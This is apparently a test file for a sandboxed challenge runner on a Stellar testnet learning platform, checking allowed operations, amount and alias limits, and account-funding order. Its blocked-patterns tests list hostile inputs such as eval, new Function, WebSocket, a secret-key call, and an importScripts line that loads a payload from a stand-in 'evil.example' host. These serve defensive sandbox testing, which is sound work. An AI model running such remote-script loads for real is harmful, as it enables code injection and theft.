import { beforeEach, describe, expect, it, vi } from 'vitest'
import { worlds, worldQuests, type ChallengeSpec } from '@stellar-learn/content'
import { parseChallengeProgram, runChallenge } from './challengeRunner'

function starterCodeFor(questId: string): string {
  for (const world of worlds) {
    const quest = worldQuests(world).find((candidate) => candidate.id === questId)
    if (quest) return (quest.content as ChallengeSpec).starterCode
  }
  throw new Error(`No quest with id ${questId} in the content registry`)
}

describe('parseChallengeProgram — valid phrasings', () => {
  it('accepts the limited testnet capability sequence', () => {
    const result = parseChallengeProgram(`
      await stellar.fundAccount('issuer')
      await stellar.fundAccount('holder')
      await stellar.createTrustline({
        account: 'holder',
        issuer: 'issuer',
        assetCode: 'FORGE',
      })
      await stellar.issueAsset({
        issuer: 'issuer',
        holder: 'holder',
        assetCode: 'FORGE',
        amount: '100',
      })
    `)

    expect(result.errors).toEqual([])
    expect(result.actions).toEqual([
      { type: 'fundAccount', account: 'issuer' },
      { type: 'fundAccount', account: 'holder' },
      { type: 'createTrustline', account: 'holder', issuer: 'issuer', assetCode: 'FORGE' },
      { type: 'issueAsset', issuer: 'issuer', holder: 'holder', assetCode: 'FORGE', amount: '100' },
    ])
  })

  it('parses the exact shipped starterCode for every challenge quest', () => {
    const questIds = ['q2-3-fund-testnet-account', 'q3-3-issue-test-asset', 'w8-q2-send-testnet-payment']

    for (const questId of questIds) {
      const result = parseChallengeProgram(starterCodeFor(questId))
      expect(result.errors, `quest ${questId} should parse without errors`).toEqual([])
      expect(result.actions.length, `quest ${questId} should have at least one action`).toBeGreaterThan(0)
    }
  })

  it('accepts single or double quoted aliases interchangeably', () => {
    const doubleQuoted = parseChallengeProgram(`await stellar.fundAccount("learner")`)
    const singleQuoted = parseChallengeProgram(`await stellar.fundAccount('learner')`)

    expect(doubleQuoted.errors).toEqual([])
    expect(singleQuoted.errors).toEqual([])
    expect(doubleQuoted.actions).toEqual(singleQuoted.actions)
  })

  it('accepts object literal arguments regardless of key order', () => {
    const reordered = parseChallengeProgram(`
      await stellar.sendPayment({ amount: '5', to: 'recipient', from: 'sender' })
    `)

    expect(reordered.errors).toEqual([])
    expect(reordered.actions).toEqual([
      { type: 'sendPayment', from: 'sender', to: 'recipient', amount: '5' },
    ])
  })

  it('accepts minified single-line and loosely formatted programs', () => {
    const minified = parseChallengeProgram(
      `await stellar.fundAccount('a');await stellar.fundAccount('b');await stellar.sendPayment({from:'a',to:'b',amount:'5'});`
    )

    expect(minified.errors).toEqual([])
    expect(minified.actions).toEqual([
      { type: 'fundAccount', account: 'a' },
      { type: 'fundAccount', account: 'b' },
      { type: 'sendPayment', from: 'a', to: 'b', amount: '5' },
    ])
  })

  it('accepts a trailing comma in an object literal', () => {
    const result = parseChallengeProgram(`
      await stellar.createTrustline({
        account: 'holder',
        issuer: 'issuer',
        assetCode: 'FORGE',
      })
    `)

    expect(result.errors).toEqual([])
    expect(result.actions).toEqual([
      { type: 'createTrustline', account: 'holder', issuer: 'issuer', assetCode: 'FORGE' },
    ])
  })
})

describe('parseChallengeProgram — blocked patterns', () => {
  it.each([
    ['fetch', 'await fetch("https://horizon.stellar.org")'],
    ['XMLHttpRequest', 'const req = new XMLHttpRequest()'],
    ['WebSocket', 'const socket = new WebSocket("wss://example.com")'],
    ['importScripts', 'importScripts("https://evil.example/payload.js")'],
    ['eval', 'eval("stellar.fundAccount(\'x\')")'],
    ['Function', 'const run = new Function("return 1")'],
    ['mainnet', 'const network = mainnet'],
    ['Networks.PUBLIC', 'const passphrase = Networks.PUBLIC'],
    ['horizon.stellar.org', 'const url = horizon.stellar.org'],
  ])('blocks arbitrary network / execution primitive: %s', (token, source) => {
    const result = parseChallengeProgram(source)
    expect(result.errors).toEqual([`${token} is not available in the testnet challenge sandbox.`])
    expect(result.actions).toEqual([])
  })

  it.each([['stellar.deployContract'], ['stellar.getSecretKey'], ['stellar.mainnetPay'], ['stellar.unknownOp']])(
    'rejects unknown capability call: %s',
    (call) => {
      const result = parseChallengeProgram(`await ${call}('anything')`)
      expect(result.errors).toEqual([`${call} is not an allowed challenge operation.`])
    }
  )

  it('does not execute a capability hidden in a comment or string', () => {
    const result = parseChallengeProgram(`
      // await stellar.fundAccount('learner')
      const note = "stellar.fundAccount('learner')"
    `)

    expect(result.actions).toEqual([])
    expect(result.errors).toEqual([
      'Add at least one allowed stellar.* operation before running the challenge.',
    ])
  })

  it.each([
    ['123bad', "starts with a digit"],
    ['not an alias!', "contains disallowed characters"],
    ['a'.repeat(40), "exceeds the max alias length"],
  ])('rejects an unsafe account alias (%s)', (alias) => {
    const result = parseChallengeProgram(`await stellar.fundAccount('${alias}')`)
    expect(result.errors).toEqual(['fundAccount expects one quoted account alias.'])
  })

  it.each([
    ['0', 'zero is not a positive amount'],
    ['-5', 'negative amounts are rejected'],
    ['1001', 'exceeds the maximum of 1000'],
    ['1.123456789', 'exceeds seven decimal places'],
    ['abc', 'non-numeric amount'],
  ])('rejects an unsafe payment amount (%s)', (amount) => {
    const result = parseChallengeProgram(
      `await stellar.sendPayment({ from: 'a', to: 'b', amount: '${amount}' })`
    )
    expect(result.errors).toEqual([
      'sendPayment requires safe from, to, and positive amount values.',
    ])
  })

  it.each([
    ['forge', 'lowercase asset codes are rejected'],
    ['XLM', 'XLM is reserved for the native asset'],
    ['TOOLONGCODE12', 'exceeds the 12 character asset code limit'],
  ])('rejects an unsafe asset code (%s)', (assetCode) => {
    const result = parseChallengeProgram(
      `await stellar.createTrustline({ account: 'a', issuer: 'b', assetCode: '${assetCode}' })`
    )
    expect(result.errors).toEqual([
      'createTrustline requires safe account, issuer, and uppercase assetCode values.',
    ])
  })

  it('caps the number of testnet operations in a single program', () => {
    const aliases = Array.from({ length: 13 }, (_, index) => `acct${index}`)
    const source = aliases.map((alias) => `await stellar.fundAccount('${alias}')`).join('\n')

    const result = parseChallengeProgram(source)

    expect(result.actions).toHaveLength(13)
    expect(result.errors).toEqual(['A challenge can run at most 12 testnet operations at once.'])
  })
})

const mockFundTestnetAccount = vi.fn()
const mockLoadTestnetAccount = vi.fn()
const mockSendTestnetPayment = vi.fn()
const mockCreateTestnetTrustline = vi.fn()
const mockIssueTestnetAsset = vi.fn()
const mockGetTestnetAssetBalance = vi.fn()
let keypairCounter = 0

vi.mock('@stellar-learn/stellar/challenges', () => ({
  generateTestnetKeypair: () => {
    keypairCounter += 1
    return { publicKey: `GPUBLIC${keypairCounter}`, secretKey: `SSECRET${keypairCounter}` }
  },
  fundTestnetAccount: (...args: unknown[]) => mockFundTestnetAccount(...args),
  loadTestnetAccount: (...args: unknown[]) => mockLoadTestnetAccount(...args),
  sendTestnetPayment: (...args: unknown[]) => mockSendTestnetPayment(...args),
  createTestnetTrustline: (...args: unknown[]) => mockCreateTestnetTrustline(...args),
  issueTestnetAsset: (...args: unknown[]) => mockIssueTestnetAsset(...args),
  getTestnetAssetBalance: (...args: unknown[]) => mockGetTestnetAssetBalance(...args),
}))

describe('runChallenge — execution order and limits', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    keypairCounter = 0
    mockFundTestnetAccount.mockResolvedValue(undefined)
    mockLoadTestnetAccount.mockResolvedValue({})
    mockCreateTestnetTrustline.mockResolvedValue({ hash: 'trustline-hash', ledger: 1, successful: true })
    mockIssueTestnetAsset.mockResolvedValue({ hash: 'issue-hash', ledger: 1, successful: true })
  })

  it('funds accounts and sends a payment when accounts are prepared in order', async () => {
    mockGetTestnetAssetBalance.mockReturnValueOnce('10').mockReturnValueOnce('16')
    mockSendTestnetPayment.mockResolvedValue({ hash: 'payment-hash', ledger: 2, successful: true })

    const result = await runChallenge({
      challengeId: 'w8-q2-send-testnet-payment',
      code: `
        await stellar.fundAccount('sender')
        await stellar.fundAccount('recipient')
        await stellar.sendPayment({ from: 'sender', to: 'recipient', amount: '5' })
      `,
      validationRules: [
        { type: 'tx_success', params: { transaction: 'sendPayment' }, errorMessage: 'Send a payment.' },
        {
          type: 'balance_check',
          params: { account: 'recipient', assetCode: 'XLM', minimumDelta: '5' },
          errorMessage: 'Recipient needs 5 more XLM.',
        },
      ],
    })

    expect(result.passed).toBe(true)
    expect(mockSendTestnetPayment).toHaveBeenCalledTimes(1)
  })

  it('fails a payment that references an account never funded (out-of-order calls)', async () => {
    const result = await runChallenge({
      challengeId: 'w8-q2-send-testnet-payment',
      code: `
        await stellar.sendPayment({ from: 'sender', to: 'recipient', amount: '5' })
      `,
      validationRules: [
        { type: 'tx_success', params: { transaction: 'sendPayment' }, errorMessage: 'Send a payment.' },
      ],
    })

    expect(result.passed).toBe(false)
    expect(mockSendTestnetPayment).not.toHaveBeenCalled()
    expect(result.logs.some((line) => line.includes('sender must be funded'))).toBe(true)
  })

  it('fails a trustline that references an unfunded issuer even though the holder is funded', async () => {
    const result = await runChallenge({
      challengeId: 'q3-3-issue-test-asset',
      code: `
        await stellar.fundAccount('holder')
        await stellar.createTrustline({ account: 'holder', issuer: 'issuer', assetCode: 'FORGE' })
      `,
      validationRules: [
        { type: 'tx_success', params: { transaction: 'createTrustline' }, errorMessage: 'Open a trustline.' },
      ],
    })

    expect(result.passed).toBe(false)
    expect(mockCreateTestnetTrustline).not.toHaveBeenCalled()
    expect(result.logs.some((line) => line.includes('issuer must be funded'))).toBe(true)
  })

  it('rejects preparing more temporary accounts than the runner allows', async () => {
    const aliases = Array.from({ length: 7 }, (_, index) => `acct${index}`)
    const code = aliases.map((alias) => `await stellar.fundAccount('${alias}')`).join('\n')

    const result = await runChallenge({
      challengeId: 'q2-3-fund-testnet-account',
      code,
      validationRules: [
        { type: 'account_created', params: { account: 'acct6' }, errorMessage: 'acct6 must exist.' },
      ],
    })

    expect(result.passed).toBe(false)
    expect(mockFundTestnetAccount).toHaveBeenCalledTimes(6)
    expect(result.logs.some((line) => line.includes('at most 6 accounts'))).toBe(true)
  })
})
